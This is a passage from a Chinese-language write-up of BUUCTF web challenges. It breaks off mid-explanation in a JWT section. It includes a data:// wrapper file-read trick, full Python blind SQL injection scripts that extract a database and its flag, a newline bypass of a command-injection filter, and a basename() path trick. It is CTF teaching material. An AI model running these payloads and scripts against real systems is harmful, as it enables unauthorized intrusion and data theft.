class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>);  <span class="comment"># 先解码</span></span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;  <span class="comment">#解码后的每一个字符ord转为ascii码之后,加上i*2</span></span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里首先需要满足: <code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>, 通过<code>data://</code>伪协议即可:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2333=data://text/plain,todat is a happy day</span><br></pre></td></tr></table></figure>

<p>下一步需要通过file参数来读取<code>flag.php</code> , 这里<code>file</code>参数会经过<code>change</code>的处理, 传入编码后的字符串,解码后将每一位的<code>ascii</code>码都加上当前数组下标值得两倍</p>
<p>那么反过来将<code>flag.php</code>每一位的ascii码都减去下标的两倍就得到 : <code>fj]a&amp;f\b</code>, 再将其编码之后作为参数传进去就行了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>

<p>注意这里要把上一步传的<code>Merak</code>删掉,不然会在判定该参数是否存在时直接退出.</p>
<p>查看源码得到flag</p>
<br>

<hr>
<br>

<h1 id="逻辑盲注-颜值成绩查询"><a href="#逻辑盲注-颜值成绩查询" class="headerlink" title="[逻辑盲注]颜值成绩查询"></a>[逻辑盲注]颜值成绩查询</h1><p>注入题,先尝试输入一些payload看看注入点在哪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://22ad9de1-c8df-47c0-8c13-822750f017cf.node4.buuoj.cn:81/?stunum=2#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web2/image-20221025123129925.png" alt="image-20221025123129925" style="zoom:67%;" />



<p>存在逻辑注入:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1^1)</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221025123522202.png" alt="image-20221025123522202"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(3&amp;&amp;2)</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221025123727768.png" alt="image-20221025123727768"></p>
<p>数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1&amp;&amp;(length(database())=4))   ---student number not exists.</span><br><span class="line">(1&amp;&amp;(length(database())=3))   ---Hi admin, your score is: 100</span><br></pre></td></tr></table></figure>

<p>后面使用上面的方法就爆不出数据库名了,不知道为什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1&amp;&amp;ascii((substr(database(),1,1))=ord(c))))</span><br></pre></td></tr></table></figure>

<p>把<code>&amp;&amp;</code>换成<code>and</code>,这里发现空格被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1/**/and/**/1=1#</span><br><span class="line">Hi admin, your score is: 100</span><br><span class="line">1 and 1=1#</span><br><span class="line">student number not exists.</span><br></pre></td></tr></table></figure>

<p>爆数据库名:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line">base_url = <span class="string">&quot;http://bb625ab1-7046-49f8-923e-d3312349b26f.node4.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>):</span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">get_database_name(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 库名: ctf</span></span><br></pre></td></tr></table></figure>

<p>爆表名:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">// 表名:flag</span><br></pre></td></tr></table></figure>



<p>爆列名:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">//列名: flag,value</span><br></pre></td></tr></table></figure>

<p>爆数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;1/**/and/**/(substr((select/**/group_concat(value)/**/from/**/flag),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">//flag&#123;debd4fbe-9cc4-<span class="number">4e30</span>-9f3e-6a2ad2b04eb5&#125;</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="换行符绕正则-RCEService"><a href="#换行符绕正则-RCEService" class="headerlink" title="[换行符绕正则]RCEService"></a>[换行符绕正则]RCEService</h1><img src="/images/buuctf-web2/image-20221025144311248.png" alt="image-20221025144311248" style="zoom:67%;" />

<p>需要输入<code>json</code>格式的命令,现场时让键为<code>command</code>发现被过滤了,换成<code>cmd</code>成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;command&quot;:&quot;whoami&quot;&#125;</span><br><span class="line">&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;</span><br><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221025144755368.png" alt="image-20221025144755368"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>使用换行符</strong>来绕过<code>preg_match</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/&quot;%0a&#125;</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/home/rceservice&quot;%0a&#125;</span><br><span class="line">flag jail</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;tac%20/home/rceservice/flag&quot;%0a&#125;</span><br><span class="line">这里试了几个读文件的命令,都无法执行</span><br><span class="line"></span><br><span class="line">直接使用绝对路径来执行命令</span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;ls%20/bin&quot;%0a&#125;</span><br><span class="line">bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sleep stty su sync tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew</span><br><span class="line"></span><br><span class="line">cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0a&#125;</span><br><span class="line">flag&#123;d45d20f3-c8ef-45b6-9851-075783c8a91b&#125;</span><br></pre></td></tr></table></figure>

<p>这里还有个小知识点,这里看到存在<code> /home/rceservice/jail</code></p>
<blockquote>
<p>putenv 相当于一个简陋的沙盒, 让 shell 默认从 <code>/home/rceservice/jail</code> 下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (&#x2F;bin&#x2F;cat) 就能够绕过限制了</p>
</blockquote>
<br>

<hr>
<br>

<h1 id="basename-Can-you-guess-it"><a href="#basename-Can-you-guess-it" class="headerlink" title="[basename]Can you guess it?"></a>[basename]Can you guess it?</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; //这里匹配config.php/结尾的字符串</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); //当前php文件对于网站根目录的相对地址</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64)); //转为16进制之后为长度为128的字符串</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;  //比较两个字符串</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这里猜数估计是猜不出来了</p>
<p>漏洞在<code>basename</code>那里, 该函数用于返回路径中的文件名部分,例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">basename(&quot;/testweb/home.php&quot;) = &quot;home.php&quot;</span><br><span class="line"></span><br><span class="line">如果设置了扩展名,则输出是不包含扩展名</span><br><span class="line">basename(&quot;/testweb/home.php&quot;,&quot;.php&quot;) = &quot;home&quot;</span><br></pre></td></tr></table></figure>

<p><code>basename</code>在解析文件路径时,会忽略一部分非<code>ASCII</code>字符</p>
<p>可以测试一下有哪些字符会被忽略:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$filename</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);    <span class="comment">//变为 index/某字符</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>) === <span class="string">&quot;index.php&quot;</span>)&#123;  <span class="comment">//如果basename将&quot;/某字符&quot;删除, 则说明这个字符会被其忽略</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果显示: <code>ascii</code>值为47、128-255的字符均会被其删除,其中47为”&#x2F;“, 另外会被删除的还包括汉字和中文标点</p>
<p>那么在本题中, 要绕过匹配,则可以传<code>config.php/%ff</code> 这里<code>%ff</code>在后面会被<code>basename</code>删除,所以不影响读取该文件, 而题目中的正则表达式尾部时<code>$</code>,表示匹配尾部为<code>config.php/</code>的字符串,而这里在尾部又加了其他字符,所以也就匹配不到了</p>
<p>另外, 必须给<code>index.php</code>传参<code>source</code>才能触发读取文件,所以最后的payload可以为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://96993b6d-bf64-4b7c-be18-69e708540bca.node4.buuoj.cn:81/index.php/config.php/%ff?source=1</span><br></pre></td></tr></table></figure>

<p>这里传<code>/index.php/config.php</code>不影响访问<code>index.php</code></p>
<p>而在<code>basename</code>处理时,其会首先删除路径部分, 也就是<code>index.php/</code>,然后删除后面<code>%ff</code>,最后的结果为<code>config.php</code>,成功读取</p>
<br>

<hr>
<br>

<h1 id="脚本爆破-JWT-pickle反序列化-ikun"><a href="#脚本爆破-JWT-pickle反序列化-ikun" class="headerlink" title="[脚本爆破,JWT,pickle反序列化]ikun"></a>[脚本爆破,JWT,pickle反序列化]ikun</h1><p><img src="/images/buuctf-web2/image-20221025183851502.png" alt="image-20221025183851502"></p>
<p><img src="/images/buuctf-web2/image-20221025185149755.png" alt="image-20221025185149755"></p>
<p>这里说要买到lv6 ,但是不知道是那一页 ,所以先用脚本跑一下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">base_url = <span class="string">&quot;http://1abf08df-2767-4d81-a779-7356c6c5e545.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;_xsrf&#x27;</span>: <span class="string">&#x27;2|c3cd89d3|eee6aaae103a266c0069323a94da635e|1666692736&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;JWT&#x27;</span>: <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = base_url + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    res = session.get(url, cookies=cookies).text</span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>在180页发现了lv6</p>
<p><img src="/images/buuctf-web2/image-20221025185317801.png" alt="image-20221025185317801"></p>
<p>但是很贵,根本买不起</p>
<img src="/images/buuctf-web2/image-20221025185716790.png" alt="image-20221025185716790" style="zoom:67%;" />

<p>抓包修改价格会显示操作失败, 修改折扣后成功, 出现了 <code>/b1g_m4mber </code>这个地址</p>
<p>访问后会显示只允许<code>admin</code>访问,这里尝试添加头字段失败后,注意到包中还有<code>JWT</code>这个字段:</p>
<p><img src="/images/buuctf-web2/image-20221025190252201.png" alt="image-20221025190252201"></p>
<blockquote>
<p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循JSON格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于<code>token</code>的身份验证可以替代传统的cookie+session身份验证方法。</p>
<p>整个<code>token</code>由三部分组成:<code>header</code>、<code>payload</code>、<code>signature</code>(用于认证信息的完整性)</p>
<p>其中,<code>header</code>的格式为</p>
